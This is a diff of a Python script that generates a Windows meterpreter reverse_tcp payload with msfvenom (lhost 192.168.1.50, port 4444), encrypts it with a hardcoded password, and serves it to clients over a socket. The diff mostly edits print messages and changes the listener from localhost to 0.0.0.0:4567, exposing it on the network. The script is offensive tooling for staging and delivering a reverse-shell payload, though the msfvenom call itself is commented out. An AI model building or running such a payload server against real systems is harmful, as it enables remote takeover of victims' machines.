@@ -7,7 +7,7 @@ import sys
 #--------------------------------------------------------------------------------------------------------------
 
 def create_payload_msfvenom(lhost, lport, file):
-	print('\n+ Creating payload ... \n')
+	print('+ Creating payload ...')
 	
 	#system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
 	#print('\n'+system_call+'\n')
@@ -15,9 +15,9 @@ def create_payload_msfvenom(lhost, lport, file):
 	#result = os.system(system_call)
 	result = 0
 	if result == 0:
-		print('\n+ Payload created and saved as: ' + file + '\n')
+		print('+ Payload created and saved as: ' + file)
 	else:
-		print('\n+ Payload not created, something went wrong!! \n')
+		print('+ Payload not created, something went wrong!!')
 
 #--------------------------------------------------------------------------------------------------------------
 
@@ -36,7 +36,7 @@ def clean_payload_msfvenom(file):
 		return payload_readed
 
 	except IOError:
-		print('\n+ It could not be possible to open the payload file, something went wrong!!\n')
+		print('+ It could not be possible to open the payload file, something went wrong!!')
 
 #--------------------------------------------------------------------------------------------------------------
 
@@ -65,22 +65,22 @@ def create_socket(ip_address, port, payload_to_send):
 	server_address = (sock_ip_address, sock_port)
 	sock.bind(server_address)
 	sock.listen(1)
-	print('\n+ Socket created and listening on ' + ip_address + ':' + str(port) +'\n')
+	print('+ Socket created and listening on ' + ip_address + ':' + str(port))
 	connection, client_address = sock.accept()
 
 	with connection:
-		print('\n+ + Connected by ', client_address)
+		print('+ + Connected by ', client_address)
 		connection.sendall(b'Type "exit" to end session\n')
 		connection.sendall(b'Type "receive" to get the payload\n')
 		while True:
 			data = connection.recv(1024)
 			message = data.decode('utf-8')
 			if message == 'exit\n':
-				print(message)
+				print('+ + Session exited by client!!')
 				sock.close()
 				break
 			elif message == 'receive\n':
-				print(message)
+				print('+ + Sending payload to client ...')
 				connection.sendall(payload_to_send)
 			else:
 				print(message)
@@ -105,6 +105,8 @@ if __name__ == '__main__':
 	write_screen("Script started")
 
 	password = 'spiderman'
+	ip_address = '0.0.0.0'
+	port = 4567
 
 	create_payload_msfvenom('192.168.1.50','4444', 'payload.txt')
 
@@ -120,7 +122,7 @@ if __name__ == '__main__':
 	#payload_decrypted = decrypt_payload(payload_encrypted, password)
 	#print(payload_decrypted)
 
-	create_socket('127.0.0.1', 4567, payload_encrypted)
+	create_socket(ip_address, port, payload_encrypted)
 
 	write_screen("Script finished")
 	print('\n')
